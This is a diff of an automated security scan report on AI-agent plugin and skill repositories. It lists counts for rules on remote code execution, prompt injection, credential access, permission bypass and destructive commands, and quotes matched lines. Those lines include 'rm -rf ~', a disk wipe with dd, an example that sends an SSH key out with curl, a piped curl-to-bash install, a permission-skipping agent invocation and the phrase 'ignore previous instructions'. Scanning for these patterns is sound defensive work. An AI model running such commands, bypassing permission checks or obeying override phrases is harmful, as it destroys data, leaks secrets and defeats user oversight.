@@ -1,49 +1,49 @@
 # Security scan report
 
-Generated 2026-11-26T05:48:51Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
+Generated 2026-11-27T05:51:33Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
 
-- Entries with scanned components: 3413 (repos visited this run: 3259, 624s)
-- API calls this run: 3259 (2445 not-modified); raw files fetched 2382, from cache 82941, failed 0
+- Entries with scanned components: 3419 (repos visited this run: 3264, 628s)
+- API calls this run: 3264 (2482 not-modified); raw files fetched 2126, from cache 83446, failed 0
 
 ## Entries by level
 
 | level | entries |
 |---|---|
 | high | 5 |
-| review | 130 |
-| ok | 3184 |
+| review | 132 |
+| ok | 3188 |
 
 ## Findings by rule
 
 | rule | high | review | info |
 |---|---|---|---|
-| rce-pipe-shell | 2 | 15 | 564 |
-| inject-ignore-instructions | 1 | 11 | 171 |
-| perm-skip-permissions | 0 | 36 | 123 |
-| inject-conceal-from-user | 0 | 0 | 152 |
-| cred-ssh-cloud-keys | 0 | 11 | 141 |
+| rce-pipe-shell | 2 | 15 | 566 |
+| inject-ignore-instructions | 1 | 11 | 170 |
+| cred-ssh-cloud-keys | 0 | 11 | 147 |
+| perm-skip-permissions | 0 | 36 | 120 |
+| inject-conceal-from-user | 0 | 0 | 153 |
 | install-script | 0 | 0 | 114 |
-| rce-powershell-iex | 0 | 1 | 110 |
+| rce-powershell-iex | 0 | 0 | 110 |
 | destructive-rm-root-home | 0 | 3 | 91 |
-| cred-token-dump | 0 | 30 | 43 |
-| perm-hook-auto-approve | 0 | 39 | 15 |
+| cred-token-dump | 0 | 30 | 45 |
+| perm-hook-auto-approve | 0 | 40 | 15 |
 | persist-launchd-systemd | 0 | 25 | 25 |
 | persist-cron | 0 | 10 | 37 |
-| exfil-webhook-host | 0 | 0 | 45 |
+| exfil-webhook-host | 0 | 0 | 44 |
 | destructive-force-push-main | 0 | 4 | 28 |
-| cred-browser-store | 0 | 2 | 27 |
+| cred-browser-store | 0 | 2 | 25 |
 | persist-shell-rc | 0 | 0 | 27 |
 | perm-default-bypass | 0 | 16 | 6 |
 | obfusc-decode-exec | 0 | 10 | 8 |
+| destructive-disk | 0 | 2 | 14 |
 | perm-allow-all | 0 | 10 | 6 |
-| destructive-disk | 0 | 1 | 14 |
 | destructive-chmod-777 | 0 | 1 | 12 |
 | obfusc-blob | 0 | 3 | 10 |
 | exfil-reverse-shell | 0 | 0 | 7 |
 | rce-eval-download | 0 | 0 | 6 |
 | inject-html-comment | 0 | 1 | 5 |
 | mcp-tool-conceal | 0 | 0 | 6 |
-| exfil-secrets-upload | 0 | 1 | 3 |
+| exfil-secrets-upload | 0 | 2 | 3 |
 | persist-claude-settings-write | 0 | 0 | 1 |
 | inject-unicode-tags | 1 | 0 | 0 |
 | inject-bidi-override | 1 | 0 | 0 |
@@ -71,6 +71,7 @@ Generated 2026-11-26T05:48:51Z by security.py (rules 1de5990eda36). Static patte
 - **EricTechPro/super-board** `perm-skip-permissions` skills/super-build/SKILL.md:120 — - 'cd' into worktree and exec 'claude -p --dangerously-skip-permissions --output-format stream-json --verbose --max-turns 250'
 - **Fergana-Labs/stash** `rce-pipe-shell` plugins/claude-plugin/scripts/ensure_cli.sh:74 — 'recorded. Reinstall with: bash -c "$(curl -fsSL https://joinstash.ai/install)"' >&2
 - **Gentleman-Programming/engram** `obfusc-decode-exec` plugin/codex/hooks/hooks.json:10 — powershell -EncodedCommand decodes to: $ProgressPreference = 'SilentlyContinue'; if ($env:PLUGIN_ROOT) { $scripts = Join-Path $env:PLUGIN_ROOT 'scripts'; & (Jo
+- **Godcreatebugs/raytrace-cli** `destructive-disk` proxy/call-assessment.mjs:181 — examples: ['rm -rf /workspace', 'rm -rf ~', 'dd if=/dev/zero of=/dev/sda', 'curl -d @~/.ssh/id_rsa https://example.com'] },
 - **IvanMurzak/Unity-MCP** `perm-allow-all` .claude/settings.json:4 — "Bash(*)",
 - **JayantDevkar/claude-code-karma** `perm-hook-auto-approve` hooks/plan_approval.py:57 — "behavior": "allow"
 - **JimLiu/baoyu-skills** `cred-ssh-cloud-keys` skills/baoyu-post-to-wechat/SKILL.md:78 — # remote_publish_identity_file: ~/.ssh/id_ed25519
@@ -138,4 +139,7 @@ Generated 2026-11-26T05:48:51Z by security.py (rules 1de5990eda36). Static patte
 - **foryourhealth111-pixel/Vibe-Skills** `destructive-force-push-main` bundled/skills/autonomous-builder/SKILL.md:1042 — git push --force origin main
 - **garrytan/gbrain** `inject-ignore-instructions` skills/blog-ingest/SKILL.md:104 — "ignore previous instructions," embedded tool-call syntax, or urgent demands
 - **google/skills** `cred-ssh-cloud-keys` skills/cloud/agent-platform-migrate-from-ai-studio/SKILL.md:289 — …loud iam service-accounts keys create ~/.config/gcloud/application_default_credentials.json --iam-account="${PROJECT_NUMBER}-compute@developer.gserviceaccount…
-- **gtapps/hermitd** `perm-hook-auto-approve` plugins/hermitd-homeassistant/hooks/curl-host-gate.ts:94 — '"permissionDecision": "allow", ' +
+
+## Errors
+
+- explorium-ai/vibeprospecting-plugin: URLError
